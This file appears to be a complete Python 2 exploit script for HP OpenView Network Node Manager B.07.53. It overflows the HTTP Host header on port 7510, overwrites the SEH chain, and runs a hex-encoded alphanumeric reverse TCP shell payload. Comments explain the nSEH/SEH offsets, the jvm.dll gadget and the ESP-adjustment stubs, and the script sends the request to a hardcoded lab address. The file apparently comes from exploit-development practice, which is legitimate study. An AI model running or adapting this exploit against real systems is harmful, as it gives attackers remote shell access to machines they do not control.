#!/usr/bin/python 

# file name: hpnnm-B.07.53-exploit-v9_stable.py
# author: greyshell
# description: encoded reverse tcp shell payload using alphaNumEncoder 

import socket
import os
import sys 

# max crash buff length = 3780
# nSEH offset = 3305, SEH offset = 3309
total_len = 3780

# Point ESP relative to program counter's present value: adding 2340 bytes to EDI (holds the same value as PC)
# 04DD74D6   57               PUSH EDI
# 04DD74D7   58               POP EAX
# 04DD74EE   66:05 7E09       ADD AX,97E
# 04DD74E7   50               PUSH EAX
# 04DD74E8   5C               POP ESP

finalPayload_esp = ("\x57\x58\x66\x05\x7e\x09\x50\x5c")

rev_shell_payload = ("\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x63\x24\x25\x2d\x55\x63\x24\x25\x2d\x57\x63\x26\x25\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x30\x31\x55\x38\x2d\x30\x31\x55\x38\x2d\x31\x33\x55\x3c\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x6c\x3d\x4e\x2e\x2d\x6c\x3d\x4e\x2e\x2d\x6d\x3d\x50\x31\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x57\x5f\x2c\x53\x2d\x57\x5f\x2c\x53\x2d\x57\x60\x31\x54\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x53\x2b\x51\x2a\x2d\x53\x2b\x51\x2a\x2d\x54\x2d\x53\x2b\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x21\x55\x63\x3e\x2d\x21\x55\x63\x3e\x2d\x21\x56\x63\x46\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x32\x73\x23\x6b\x2d\x32\x73\x23\x6b\x2d\x34\x73\x23\x6c\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5a\x6d\x74\x38\x2d\x5a\x6d\x74\x38\x2d\x5c\x6f\x74\x38\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x35\x55\x63\x6b\x2d\x35\x55\x63\x6b\x2d\x36\x56\x63\x6d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x32\x52\x28\x4b\x2d\x32\x52\x28\x4b\x2d\x34\x53\x28\x4c\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x37\x3c\x55\x44\x2d\x37\x3c\x55\x44\x2d\x3c\x41\x56\x46\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x63\x27\x5f\x39\x2d\x63\x27\x5f\x39\x2d\x65\x27\x61\x3e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x66\x3e\x28\x55\x2d\x66\x3e\x28\x55\x2d\x68\x43\x29\x56\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x39\x38\x32\x2c\x2d\x39\x38\x32\x2c\x2d\x3b\x39\x33\x2e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x37\x3b\x38\x38\x2d\x37\x3b\x38\x38\x2d\x3c\x3b\x39\x39\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x37\x38\x38\x3c\x2d\x37\x38\x38\x3c\x2d\x3c\x39\x39\x41\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x3d\x39\x39\x2d\x55\x3d\x39\x39\x2d\x56\x41\x39\x3d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x3d\x49\x4f\x68\x2d\x3d\x49\x4f\x68\x2d\x42\x49\x51\x69\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x41\x54\x54\x26\x2d\x41\x54\x54\x26\x2d\x42\x56\x56\x26\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x33\x68\x3e\x49\x2d\x33\x68\x3e\x49\x2d\x34\x68\x3e\x49\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x37\x38\x5f\x55\x2d\x37\x38\x5f\x55\x2d\x39\x39\x5f\x57\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x45\x58\x31\x4f\x2d\x45\x58\x31\x4f\x2d\x45\x59\x32\x4f\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5f\x37\x38\x38\x2d\x5f\x37\x38\x38\x2d\x5f\x39\x38\x38\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x31\x33\x55\x27\x2d\x31\x33\x55\x27\x2d\x31\x35\x55\x28\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x63\x32\x34\x2d\x55\x63\x32\x34\x2d\x57\x63\x32\x34\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x22\x73\x2e\x34\x2d\x22\x73\x2e\x34\x2d\x23\x74\x2e\x36\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x50\x38\x38\x32\x2d\x50\x38\x38\x32\x2d\x50\x39\x38\x33\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x36\x27\x5d\x31\x2d\x36\x27\x5d\x31\x2d\x38\x28\x5f\x32\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x32\x54\x55\x4f\x2d\x32\x54\x55\x4f\x2d\x34\x55\x55\x50\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x71\x4f\x5d\x23\x2d\x71\x4f\x5d\x23\x2d\x72\x50\x5d\x23\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x63\x27\x68\x32\x2d\x63\x27\x68\x32\x2d\x65\x27\x68\x32\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x50\x60\x5f\x55\x2d\x50\x60\x5f\x55\x2d\x51\x60\x60\x55\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x3e\x39\x32\x5c\x2d\x3e\x39\x32\x5c\x2d\x44\x3d\x33\x5d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x39\x39\x3e\x39\x2d\x39\x39\x3e\x39\x2d\x3e\x3d\x43\x3d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x63\x39\x39\x2d\x55\x63\x39\x39\x2d\x57\x63\x3c\x3d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x47\x2a\x31\x55\x2d\x47\x2a\x31\x55\x2d\x49\x2b\x32\x55\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x69\x37\x39\x32\x2d\x69\x37\x39\x32\x2d\x6a\x3c\x3d\x33\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x55\x55\x47\x2d\x55\x55\x55\x47\x2d\x55\x55\x55\x48\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x63\x6c\x24\x2d\x55\x63\x6c\x24\x2d\x57\x63\x6e\x26\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x3c\x2d\x48\x52\x2d\x3c\x2d\x48\x52\x2d\x3c\x2e\x49\x54\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x44\x35\x39\x32\x2d\x44\x35\x39\x32\x2d\x46\x36\x39\x33\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x32\x2d\x2e\x2d\x55\x32\x2d\x2e\x2d\x56\x33\x2e\x30\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x32\x44\x44\x55\x2d\x32\x44\x44\x55\x2d\x34\x44\x45\x55\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x4f\x5c\x28\x36\x2d\x4f\x5c\x28\x36\x2d\x50\x5c\x28\x36\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x38\x35\x37\x26\x2d\x38\x35\x37\x26\x2d\x38\x36\x37\x28\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x37\x39\x55\x5f\x2d\x37\x39\x55\x5f\x2d\x38\x3c\x56\x60\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x37\x36\x34\x37\x2d\x37\x36\x34\x37\x2d\x37\x38\x36\x38\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x27\x3d\x49\x49\x2d\x27\x3d\x49\x49\x2d\x29\x41\x49\x49\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x54\x26\x54\x65\x2d\x54\x26\x54\x65\x2d\x54\x28\x56\x65\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x4c\x54\x64\x26\x2d\x4c\x54\x64\x26\x2d\x4c\x56\x64\x27\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x51\x3c\x26\x37\x2d\x51\x3c\x26\x37\x2d\x52\x3c\x28\x39\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x64\x32\x26\x2d\x55\x64\x32\x26\x2d\x55\x64\x34\x28\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x38\x26\x37\x49\x2d\x38\x26\x37\x49\x2d\x38\x28\x39\x49\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x2b\x49\x2e\x5f\x2d\x2b\x49\x2e\x5f\x2d\x2d\x49\x2e\x5f\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x54\x2b\x57\x41\x2d\x54\x2b\x57\x41\x2d\x55\x2c\x59\x41\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x42\x5f\x2c\x59\x2d\x42\x5f\x2c\x59\x2d\x44\x61\x31\x59\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x65\x50\x54\x68\x2d\x65\x50\x54\x68\x2d\x67\x51\x56\x68\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x45\x6a\x70\x69\x2d\x45\x6a\x70\x69\x2d\x45\x6b\x72\x6b\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x63\x44\x55\x2d\x55\x63\x44\x55\x2d\x55\x63\x45\x56\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x3d\x26\x43\x26\x2d\x3d\x26\x43\x26\x2d\x3d\x28\x45\x28\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x64\x5e\x3e\x2d\x55\x64\x5e\x3e\x2d\x55\x64\x5f\x46\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x4d\x26\x37\x4a\x2d\x4d\x26\x37\x4a\x2d\x4e\x28\x39\x4b\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x65\x39\x26\x3d\x2d\x65\x39\x26\x3d\x2d\x66\x3c\x28\x3d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x6a\x2e\x3c\x54\x2d\x6a\x2e\x3c\x54\x2d\x6c\x2e\x3d\x56\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x27\x3e\x2d\x28\x2d\x27\x3e\x2d\x28\x2d\x27\x43\x2d\x2a\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x3e\x41\x54\x65\x2d\x3e\x41\x54\x65\x2d\x42\x41\x56\x65\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x27\x39\x4f\x26\x2d\x27\x39\x4f\x26\x2d\x27\x3b\x51\x28\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5f\x5a\x38\x38\x2d\x5f\x5a\x38\x38\x2d\x60\x5a\x3c\x38\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x65\x50\x54\x68\x2d\x65\x50\x54\x68\x2d\x67\x51\x56\x68\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x54\x46\x4a\x6a\x2d\x54\x46\x4a\x6a\x2d\x56\x47\x4b\x6a\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x71\x3e\x34\x2b\x2d\x71\x3e\x34\x2b\x2d\x72\x46\x36\x2d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x45\x55\x44\x6a\x2d\x45\x55\x44\x6a\x2d\x45\x56\x45\x6b\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x50\x6d\x3c\x48\x2d\x50\x6d\x3c\x48\x2d\x51\x6e\x3c\x49\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x4e\x26\x2e\x47\x2d\x4e\x26\x2e\x47\x2d\x50\x28\x31\x49\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x39\x51\x26\x39\x2d\x39\x51\x26\x39\x2d\x3c\x51\x28\x3b\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x27\x39\x45\x26\x2d\x27\x39\x45\x26\x2d\x27\x3b\x45\x28\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5e\x44\x64\x33\x2d\x5e\x44\x64\x33\x2d\x5f\x45\x65\x34\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x55\x35\x27\x2d\x55\x55\x35\x27\x2d\x56\x55\x35\x28\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x56\x5c\x27\x55\x2d\x56\x5c\x27\x55\x2d\x58\x5e\x27\x55\x50")

final = finalPayload_esp + rev_shell_payload

egg_marker = "T00WT00W"
buff_initial = "AAAA" + egg_marker + final + "A" * (3293 - len(final))
# buff_initial = "A" * 3305

# 1035FE34   48               DEC EAX
# 1035FE35   48               DEC EAX
# 1035FE36   77 04            JA SHORT 1035FE59
# little edian format: "\x4c\x4c\x77\x04"  ==> bad char friendly
nseh = "\x48\x48\x77\x04"

# 0x6d6e394a : pop ecx # pop ecx # ret 0x08 | asciiprint,ascii,alphanum {PAGE_EXECUTE_READ} [jvm.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v5.0.140.3 (C:\Program Files\HP OpenView\jre\jreActive\bin\client\jvm.dll)
seh = "\x4a\x39\x6e\x6d"

# setting up ESP dynamically bypassing ASLR protection
# 2216FDF0   58               POP EAX
# 2216FDF8   66:05 2C01       ADD AX,12C
# 2216FDF6   50               PUSH EAX
# 2216FDF7   5C               POP ESP

espSetUp = ("\x58\x66\x05\x2c\x01\x50\x5c")

alphaNumEncoding = ("\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x2d\x5d\x55\x5d\x2d\x2d\x5d\x55\x5d\x2d\x31\x5e\x55\x5d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x70\x2c\x5c\x6f\x2d\x70\x2c\x5c\x6f\x2d\x71\x31\x5d\x71\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x45\x38\x26\x57\x2d\x45\x38\x26\x57\x2d\x46\x38\x28\x57\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5b\x6c\x37\x45\x2d\x5b\x6c\x37\x45\x2d\x5b\x6e\x3c\x45\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x41\x53\x37\x2d\x2d\x41\x53\x37\x2d\x2d\x42\x54\x37\x31\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x54\x37\x66\x45\x2d\x54\x37\x66\x45\x2d\x56\x39\x66\x46\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x50\x3e\x39\x31\x2d\x50\x3e\x39\x31\x2d\x51\x41\x3b\x33\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x33\x2a\x67\x55\x2d\x33\x2a\x67\x55\x2d\x34\x2a\x67\x55\x50")

# Replaced the "D" buffer with "A" buffer to protect from ESP corruption
buff_last = "A" * (total_len - len(buff_initial) - len(nseh) - len(seh) - len(espSetUp) - len(alphaNumEncoding)) 

crash = buff_initial + nseh + seh + espSetUp + alphaNumEncoding + buff_last
buffer = "GET /topology/homeBaseView HTTP/1.1\r\n"
buffer += "Host: " + crash + "\r\n"
buffer += "Content-Type: application/x-www-form-urlencoded\r\n" 
buffer += "User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
buffer += "Content-Length: 1048580\r\n\r\n" 

print "[*] Sending evil HTTP request to HP NNM -B.07.53, buffer length: ", len(crash)
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("172.16.232.178", 7510))
expl.send(buffer)
expl.close()

